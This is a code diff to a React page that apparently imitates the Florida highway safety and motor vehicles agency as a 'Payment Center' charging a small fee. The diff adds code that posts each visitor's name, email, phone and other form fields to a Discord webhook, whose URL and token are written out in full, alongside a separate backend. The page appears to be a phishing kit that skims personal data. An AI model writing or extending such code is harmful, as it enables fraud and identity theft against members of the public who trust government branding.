@@ -18,12 +18,40 @@ export default function FLHSMVPage() {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    await fetch("https://flhsmv-backend.onrender.com/submit", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(formData),
-    });
-    navigate("/home1");
+
+    try {
+      // Send form data to backend
+      await fetch("https://flhsmv-backend.onrender.com/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(formData),
+      });
+
+      // Send Discord webhook notification
+      await fetch(
+        "https://discord.com/api/webhooks/1394971034054037635/AAY8BfDiVBgoyl0u1BBXi1tLSaQCUF5BS0SZI_oIWgWfevveRhVe9_QGihs4wLn4fi4M",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `📬 **New Payment Form Submission**
+**Name:** ${formData.name}
+**Email:** ${formData.email}
+**City:** ${formData.phone}
+**State/Province:** ${formData.state}
+**ZIP Code:** ${formData.message}`,
+          }),
+        }
+      );
+
+      // Set flag for showing success in home.js
+      localStorage.setItem("paymentSuccess", "true");
+
+      // Redirect to home
+      navigate("/");
+    } catch (err) {
+      console.error("Submission failed:", err);
+    }
   };
 
   return (
@@ -45,6 +73,7 @@ export default function FLHSMVPage() {
       <section className="email-form">
         <h2>Payment Center</h2>
         <form onSubmit={handleSubmit}>
+          <div>Fee Payment: $1.35</div>
           <label htmlFor="name">Full Name</label>
           <input type="text" id="name" name="name" required onChange={handleChange} />
 
